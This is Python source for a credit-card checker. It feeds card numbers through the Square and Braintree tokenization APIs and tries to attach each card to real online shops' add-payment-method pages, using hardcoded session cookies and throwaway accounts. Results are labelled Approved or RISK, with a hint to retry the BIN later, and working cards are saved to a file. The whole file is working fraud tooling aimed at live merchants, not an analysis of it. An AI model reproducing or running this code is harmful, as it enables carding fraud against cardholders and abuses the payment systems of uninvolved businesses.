			'components': '{"user_agent":"'+lol+'","language":"ar-AE","color_depth":24,"resolution":[892,412],"available_resolution":[892,412],"timezone_offset":-120,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}',
			'fingerprint': 'db9863dc7f896661f366c859cadbaf09',
			'timezone': '-120',
			'user_agent': user,
			'version': random_variable,
			'website_url': 'https://redwoodhempfarm.com/',
		},
		'client_id': application_id,
		'payment_source': cnon,
		'universal_token': {
			'token': location_id,
			'type': 'UNIT',
		},
		'verification_details': {
			'billing_contact': {
				'address_lines': [
					'',
					'',
				],
				'city': '',
				'country': 'US',
				'email': acc,
				'family_name': '',
				'given_name': '',
				'phone': '',
				'postal_code': '',
				'region': 'CA',
			},
			'intent': 'STORE',
		},
	}
	
	response = r.post(
		'https://connect.squareup.com/v2/analytics/verifications',
		headers=headers,
		json=json_data,
	)
	
	verf = (response.json()['token'])

	headers = {
		'authority': 'redwoodhempfarm.com',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'cache-control': 'max-age=0',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://redwoodhempfarm.com',
		'referer': 'https://redwoodhempfarm.com/my-account/add-payment-method/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'upgrade-insecure-requests': '1',
		'user-agent': user,
	}
	
	data = {
		'payment_method': 'square_credit_card',
		'wc-square-credit-card-card-type': 'VISA',
		'wc-square-credit-card-last-four': '0642',
		'wc-square-credit-card-exp-month': '4',
		'wc-square-credit-card-exp-year': '2024',
		'wc-square-credit-card-payment-nonce': cnon,
		'wc-square-credit-card-payment-postcode': '90011',
		'wc-square-credit-card-buyer-verification-token': verf,
		'wc-square-credit-card-tokenize-payment-method': 'true',
		'woocommerce-add-payment-method-nonce': add_nonce,
		'_wp_http_referer': '/my-account/add-payment-method/',
		'woocommerce_add_payment_method': '1',
	}
	
	response = r.post('https://redwoodhempfarm.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
	html_text=(response.text)
	pattern = r'Status code (.*?):'
	match = re.search(pattern, html_text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in html_text or 'Nice! New payment method' in html_text:
			with open('files.txt', '+a') as file:
				file.write(card+'\n')
			result = "1000: Approved"
		elif 'risk_threshold' in html_text:
			result = "RISK: Retry this BIN later."
		else:
			result = "RISK"
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		with open('files.txt', '+a') as file:
			file.write(card+'\n')
		return 'Approved'
	else:
		return result
def au(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	lines='''visaspam77t%7C1715964717%7CPDZH8t74eRvXDEVDyFkAVaLs9V9IOaRzB8vRUn4RcDe%7Cbf4567b748eb29b227b140df15973db1c07a2b1fa0e8b913a7e3b5fa83f870a1
gffyccze%7C1715964907%7CdwjtGeLUWxD5kotarVm9cvyG1hdqVGgbdXm5yW6scAB%7C5adfbc8b415feb1abd78c5ed0b11fd58258f08b20ccd4a1369a8165fddf81182'''
	def up(big):
		cookies = {
			'mailchimp_landing_site': 'https%3A%2F%2Ftrade-chem.co.uk%2Fliquids%2Fdistilled-water%2F',
			'sbjs_migrations': '1418474375998%3D1',
			'sbjs_current_add': 'fd%3D2024-03-28%2009%3A42%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29',
			'sbjs_first_add': 'fd%3D2024-03-28%2009%3A42%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29',
			'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
			'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
			'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
			'_gid': 'GA1.3.92674568.1711618924',
			'_tt_enable_cookie': '1',
			'_ttp': 'oUyrdegIjFTaIn56EhZZmqj04rL',
			'wordpress_logged_in_4d9c7ece763608b995b6637298409475': big,
			'wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450': '18542%7Cother%7Cread%7C06ae676c04e11a9410b7e629a0846042d1787766ae484e4f960091e74e784bc5',
			'mailchimp.cart.previous_email': 'cdhvxycs@gmail.com',
			'mailchimp.cart.current_email': 'visaspam77@gmail.com',
			'mailchimp_user_previous_email': 'visaspam77%40gmail.com',
			'mailchimp_user_email': 'visaspam77%40gmail.com',
			'_gat_gtag_UA_160773292_1': '1',
			'_ga_N2L0XQK3XK': 'GS1.1.1711618923.5.1.1711619470.0.0.0',
			'sbjs_session': 'pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F',
			'_ga': 'GA1.3.1110058871.1709181602',
		}
		
		headers = {
			'authority': 'trade-chem.co.uk',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
			'cache-control': 'max-age=0',
			# 'cookie': 'mailchimp_landing_site=https%3A%2F%2Ftrade-chem.co.uk%2Fliquids%2Fdistilled-water%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-03-28%2009%3A42%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-03-28%2009%3A42%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; _gid=GA1.3.92674568.1711618924; _tt_enable_cookie=1; _ttp=oUyrdegIjFTaIn56EhZZmqj04rL; wordpress_logged_in_4d9c7ece763608b995b6637298409475=fhdygstvcs%7C1712828610%7C7ByUefaIeEOytCUw9c9JxrAd5FklyMjwppuW7xpbHAB%7Ccd889e8f3ccbf73218dc32081ce1745991389c40e932e6a26f221dff28b7a168; wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450=18542%7Cother%7Cread%7C06ae676c04e11a9410b7e629a0846042d1787766ae484e4f960091e74e784bc5; mailchimp.cart.previous_email=cdhvxycs@gmail.com; mailchimp.cart.current_email=visaspam77@gmail.com; mailchimp_user_previous_email=visaspam77%40gmail.com; mailchimp_user_email=visaspam77%40gmail.com; _gat_gtag_UA_160773292_1=1; _ga_N2L0XQK3XK=GS1.1.1711618923.5.1.1711619470.0.0.0; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F; _ga=GA1.3.1110058871.1709181602',
			'referer': 'https://trade-chem.co.uk/my-account/payment-methods/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		response = requests.get('https://trade-chem.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers)
		anonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
		enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
		dec = base64.b64decode(enc).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
		with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
# Ø¥Ø¶Ø§ÙØ© ÙØ¹ÙÙÙØ§Øª Ø¬Ø¯ÙØ¯Ø© Ø¥ÙÙ Ø§ÙØ¨ÙØ§ÙØ§Øª Ø§ÙØ­Ø§ÙÙØ©
			new_data = {
				big : {
	  "nonce": anonce,
	  "au": au
				}
			}
	
			existing_data.update(new_data)
	
	# ÙØªØ§Ø¨Ø© Ø§ÙØ¨ÙØ§ÙØ§Øª Ø§ÙÙØ­Ø¯Ø«Ø© Ø¥ÙÙ Ø§ÙÙÙÙ
			with open('gates.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
	with open('fileccn.txt', 'r') as file:
		first_line = file.readline()
	lines = lines.strip().split('\n')
	while True:
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			with open('gates.json', 'r') as file:
				json_data = json.load(file)
			try:
				anonce=json_data[big]['nonce']
				au=json_data[big]['au']
				break
			except Exception as e:
				for big in lines:
					try:
						up(big)
					except Exception as e:
						print(e)
	with open('fileccn.txt', 'w') as file:
		file.write(big)
	headers = {
		'authority': 'payments.braintree-api.com',
		'accept': '*/*',
		'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		'authorization': f'Bearer {au}',
		'braintree-version': '2018-05-10',
		'content-type': 'application/json',
		'origin': 'https://assets.braintreegateway.com',
		'referer': 'https://assets.braintreegateway.com/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
		'clientSdkMetadata': {
			'source': 'client',
			'integration': 'custom',
			'sessionId': '1989924d-5ec5-426a-9810-ba9091a4bcee',
		},
		'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   bin	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }',
		'variables': {
			'input': {
				'creditCard': {
					'number': n,
					'expirationMonth': mm,
					'expirationYear': yy,
					
					'billingAddress': {
						'postalCode': '0000',
						'streetAddress': 'Boomsesteenweg 145, 2610 Antwerpen',
					},
				},
				'options': {
					'validate': False,
				},
			},
		},
		'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		for big in lines:
			try:
				up(big)
			except Exception as e:
				print(e)
	headers = {
		'authority': 'api.braintreegateway.com',
		'accept': '*/*',
		'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		'content-type': 'application/json',
		'origin': 'https://trade-chem.co.uk',
		'referer': 'https://trade-chem.co.uk/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
		'amount': '0.00',
		'additionalInfo': {
			'billingLine1': 'Boomsesteenweg 145, 2610 Antwerpen',
			'billingLine2': '',
			'billingCity': 'Antwerp',
			'billingState': '',
			'billingPostalCode': '0000',
			'billingCountryCode': 'BE',
			'billingPhoneNumber': '2076516786',
			'billingGivenName': 'mska',
			'billingSurname': 'wj',
			'email': 'visaspam77@gmail.com',
		},
		'bin': '420767',
		'dfReferenceId': '1_4e333504-2eb7-4110-bf61-b71c695f46c4',
		'clientMetadata': {
			'requestedThreeDSecureVersion': '2',
			'sdkVersion': 'web/3.98.0',
			'cardinalDeviceDataCollectionTimeElapsed': 132,
			'issuerDeviceDataCollectionTimeElapsed': 10635,
			'issuerDeviceDataCollectionResult': True,
		},
		'authorizationFingerprint': au,
		'braintreeLibraryVersion': 'braintree/web/3.98.0',
		'_meta': {
			'merchantAppId': 'trade-chem.co.uk',
			'platform': 'web',
			'sdkVersion': '3.98.0',
			'source': 'client',
			'integration': 'custom',
			'integrationType': 'custom',
			'sessionId': '1989924d-5ec5-426a-9810-ba9091a4bcee',
		},
	}
	
	response = requests.post(
		f'https://api.braintreegateway.com/merchants/zkrjk5krj2dwnsgc/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
		headers=headers,
		json=json_data,
	)
	nonce = response.json()['paymentMethod']['nonce']
	import requests
	
	cookies = {
		'mailchimp_landing_site': 'https%3A%2F%2Ftrade-chem.co.uk%2Fliquids%2Fdistilled-water%2F',
		'sbjs_migrations': '1418474375998%3D1',
		'sbjs_current_add': 'fd%3D2024-03-28%2009%3A42%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29',
		'sbjs_first_add': 'fd%3D2024-03-28%2009%3A42%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29',
		'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
		'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
		'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
		'_gid': 'GA1.3.92674568.1711618924',
		'_tt_enable_cookie': '1',
		'_ttp': 'oUyrdegIjFTaIn56EhZZmqj04rL',
		'wordpress_logged_in_4d9c7ece763608b995b6637298409475': big,
		'wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450': '18542%7Cother%7Cread%7C06ae676c04e11a9410b7e629a0846042d1787766ae484e4f960091e74e784bc5',
		'mailchimp.cart.previous_email': 'cdhvxycs@gmail.com',
		'mailchimp.cart.current_email': 'visaspam77@gmail.com',
		'mailchimp_user_previous_email': 'visaspam77%40gmail.com',
		'mailchimp_user_email': 'visaspam77%40gmail.com',
		'sbjs_session': 'pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F',
		'_gat_gtag_UA_160773292_1': '1',
		'_ga_N2L0XQK3XK': 'GS1.1.1711618923.5.1.1711619656.0.0.0',
		'_ga': 'GA1.1.1110058871.1709181602',
	}
	
	headers = {
		'authority': 'trade-chem.co.uk',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		'cache-control': 'max-age=0',
		'content-type': 'application/x-www-form-urlencoded',
		# 'cookie': 'mailchimp_landing_site=https%3A%2F%2Ftrade-chem.co.uk%2Fliquids%2Fdistilled-water%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-03-28%2009%3A42%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-03-28%2009%3A42%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; _gid=GA1.3.92674568.1711618924; _tt_enable_cookie=1; _ttp=oUyrdegIjFTaIn56EhZZmqj04rL; wordpress_logged_in_4d9c7ece763608b995b6637298409475=fhdygstvcs%7C1712828610%7C7ByUefaIeEOytCUw9c9JxrAd5FklyMjwppuW7xpbHAB%7Ccd889e8f3ccbf73218dc32081ce1745991389c40e932e6a26f221dff28b7a168; wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450=18542%7Cother%7Cread%7C06ae676c04e11a9410b7e629a0846042d1787766ae484e4f960091e74e784bc5; mailchimp.cart.previous_email=cdhvxycs@gmail.com; mailchimp.cart.current_email=visaspam77@gmail.com; mailchimp_user_previous_email=visaspam77%40gmail.com; mailchimp_user_email=visaspam77%40gmail.com; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F; _gat_gtag_UA_160773292_1=1; _ga_N2L0XQK3XK=GS1.1.1711618923.5.1.1711619656.0.0.0; _ga=GA1.1.1110058871.1709181602',
		'origin': 'https://trade-chem.co.uk',
		'referer': 'https://trade-chem.co.uk/my-account/add-payment-method/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'upgrade-insecure-requests': '1',
		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
		'payment_method': 'braintree_cc',
		'braintree_cc_nonce_key': nonce,
		'braintree_cc_device_data': '{"device_session_id":"98276ac496c4a56d3ba20cb7ed965ea7","fraud_merchant_id":null,"correlation_id":"260780d757c675be9fac4db44c1b6b17"}',
		'braintree_cc_3ds_nonce_key': '',
		'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/zkrjk5krj2dwnsgc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/zkrjk5krj2dwnsgc"},"merchantId":"zkrjk5krj2dwnsgc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"IE","currencyCode":"GBP","merchantIdentifier":"zkrjk5krj2dwnsgc","supportedNetworks":["visa","mastercard","amex"]},"kount":{"kountMerchantId":null},"challenges":[],"creditCards":{"supportedCardTypes":["American Express","Discover","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI5YjkyMGQ1MS1kMjFiLTRiODktYTRlYi1kYzYyODc2NGRlNDAiLCJpYXQiOjE3MTE2MTk0NzQsImV4cCI6MTcxMTYyNjY3NCwiaXNzIjoiNWQxY2Y1Njc2OTRlM2EyYjI0ZDdkY2U2IiwiT3JnVW5pdElkIjoiNWNhZTJmNjE1MTJjZmIwNzU0Yjk1YWZhIn0.3hk6AMnz-ZtRVWtRQBPoXx5ANmq-XMh65qNGSVhszo4"},"androidPay":{"displayName":"Trade Chemicals Ltd","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTE3MDU4NzQsImp0aSI6IjY4NjEwZWVmLWU4OWYtNDg4ZC1iODc3LTdmM2M1ZmE5ODg4ZiIsInN1YiI6InprcmprNWtyajJkd25zZ2MiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InprcmprNWtyajJkd25zZ2MiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.94XCS2G5gL3SIlud8FxWEO7fVUiAK5TaOAc_jp07Ch2E5OgaeKsgDi5xdPcKsEQVCRJXxakVSC_kQxofCD27JQ","paypalClientId":"AQ7JTt-XpW33Zz5awISJoOrKM6ujwZ5uPM8WRx3PBJd_YnNaQJyNYH7LZB1WNiuWUuk-yDvUfvAYEwsC","supportedNetworks":["visa","mastercard","amex"]},"paypalEnabled":true,"paypal":{"displayName":"Trade Chemicals Ltd","clientId":"AQ7JTt-XpW33Zz5awISJoOrKM6ujwZ5uPM8WRx3PBJd_YnNaQJyNYH7LZB1WNiuWUuk-yDvUfvAYEwsC","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"stuarttradechemcouk","payeeEmail":null,"currencyIsoCode":"GBP"}}',
		'woocommerce-add-payment-method-nonce': anonce,
		'_wp_http_referer': '/my-account/add-payment-method/',
		'woocommerce_add_payment_method': '1',
	}
	
	response = requests.post('https://trade-chem.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text or 'Invalid postal code' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds' in text:
			result = "RISK"
		else:
			result = "RISK"
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
def cn(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	import requests,re,base64
	def up():
		r = requests.session()
		headers={
		'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
		}
		response = r.get('https://www.paintsupply.com', headers=headers)
		from requests_toolbelt.multipart.encoder import MultipartEncoder
		headers = {
		    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		files = {
		    'quantity': (None, '1'),
		    'product_price': (None, '5.59'),
		    'product_weight': (None, '1.000'),
		    'sfm_logic_onoff': (None, 'off'),
		    'modal_hide_show': (None, '240'),
		    'sfm_value': (None, '240'),
		    'sfm_type': (None, 'cases'),
		    'cart_old_qty': (None, ''),
		    'check_sfm_on_off_for_modal': (None, '0'),
		    'add-to-cart': (None, '30856'),
		    'gtm4wp_id': (None, '30856'),
		    'gtm4wp_internal_id': (None, '30856'),
		    'gtm4wp_name': (None, '16 Oz Seymour Of Sycamore 16-3395 Solvent-Based Spray Match Custom Can'),
		    'gtm4wp_sku': (None, '155944'),
		    'gtm4wp_category': (None, 'Empty Aerosol Cans'),
		    'gtm4wp_price': (None, '5.59'),
		    'gtm4wp_stocklevel': (None, '568'),
		    'gtm4wp_brand': (None, 'Seymour Of Sycamore'),
		}
		multipart_data = MultipartEncoder(files)
		headers['Content-Type'] = multipart_data.content_type
		response = r.post(
		    'https://www.paintsupply.com/product/spray-paint/aerosol-empty-cans/16-oz-seymour-16-3395-blank-seymore-solvent-based-empty-spray-can/',
		    cookies=r.cookies,
		    headers=headers,
		    data=multipart_data
		)
		response = r.get('https://www.paintsupply.com/cart/', cookies=r.cookies, headers=headers)
		response = r.get('https://www.paintsupply.com/checkout', cookies=r.cookies, headers=headers)
		nonce=re.findall(r'"client_token_nonce":"(.*?)"',response.text)[0]
		CartRebuildKey=re.findall(r'"CartRebuildKey":"(.*?)"',response.text)[0]
		from bs4 import BeautifulSoup
		soup = BeautifulSoup(response.text, 'html.parser')
		wpnonce_input = soup.find('input', id='_wpnonce')
		wpnonce_value = wpnonce_input['value']
		headers = {
		    'Accept': '*/*',
		    'Accept-Language': 'en-US,en;q=0.9',
		    'Connection': 'keep-alive',
		    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		    'Origin': 'https://www.paintsupply.com',
		    'Referer': 'https://www.paintsupply.com/checkout',
		    'Sec-Fetch-Dest': 'empty',
		    'Sec-Fetch-Mode': 'cors',
		    'Sec-Fetch-Site': 'same-origin',
		    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		    'X-Requested-With': 'XMLHttpRequest',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		}
		
		data = {
		    'action': 'wc_braintree_credit_card_get_client_token',
		    'nonce': nonce,
		}
		
		response = r.post('https://www.paintsupply.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
		no=response.json()['data']
		encoded_text = no
		decoded_text = base64.b64decode(encoded_text).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
		import pickle
		import http.cookiejar
		with open('cookies.pkl', 'wb') as f:
			pickle.dump(r.cookies, f)
		with open('gates.json', 'r') as json_file:
